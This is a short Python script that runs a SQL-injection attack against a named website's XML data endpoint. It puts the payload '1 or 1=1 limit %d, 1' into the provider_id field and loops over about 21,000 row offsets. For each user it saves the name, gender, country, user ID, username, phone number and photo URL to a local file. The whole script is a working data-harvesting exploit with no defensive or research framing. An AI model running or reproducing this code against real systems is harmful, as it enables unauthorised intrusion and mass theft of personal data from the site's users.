#coding=gbk

import requests
import json
import time

url = "http://www.melinked.com/public/data.do"
xmlPattern = '<?xml version="1.0" encoding="UTF-8"?><requests><global><resultType>json</resultType></global><request><funcId><![CDATA[hex_helome_getProfileInfoFunction]]></funcId><provider_id><![CDATA[%s]]></provider_id><query_no_cache><![CDATA[1]]></query_no_cache><table_name_replace><![CDATA[1]]></table_name_replace></request></requests>'
limitPattern = "1 or 1=1 limit %d, 1"
contentPattern = "%s, %s, %s, %s, %s, %s, %s\n"

file = open("configs.txt", "a")
content = contentPattern % ("name     ", "gender     ", "country      ", "userId     ", "username     ", "phone     ", "profilePhotoURL     ")
file.write(content)

for index in range(18000, 39298):
    xml = xmlPattern % (limitPattern % index)
    response = requests.post(url, data=xml)
    text = response.text
    try:
        if text.__contains__('success'):
            jsonData = json.loads(text)
        else:
            print("not found " + text)
            continue
    except:
        print(text)
        print("load json failed")
        continue

    userId = jsonData['responses'][0]['items'][0]['provider_id']
    username = jsonData['responses'][0]['items'][0]['uc_id']
    gender = jsonData['responses'][0]['items'][0]['gender']
    profilePhotoURL = jsonData['responses'][0]['items'][0]['profile_photo']
    phone = jsonData['responses'][0]['items'][0]['phone']
    name = jsonData['responses'][0]['items'][0]['name']
    country = jsonData['responses'][0]['items'][0]['country']

    if gender == '1':
        gender = '男'
    else:
        gender = '女'

    content = contentPattern % (name, gender, country, userId, username, phone, profilePhotoURL)
    try:
        file.write(content)
        if index % 100 == 0:
            file.close()
            file = open("configs.txt", "a")
    except:
        print("parse error")
    # time.sleep(0.2)
    print(index)
file.close()

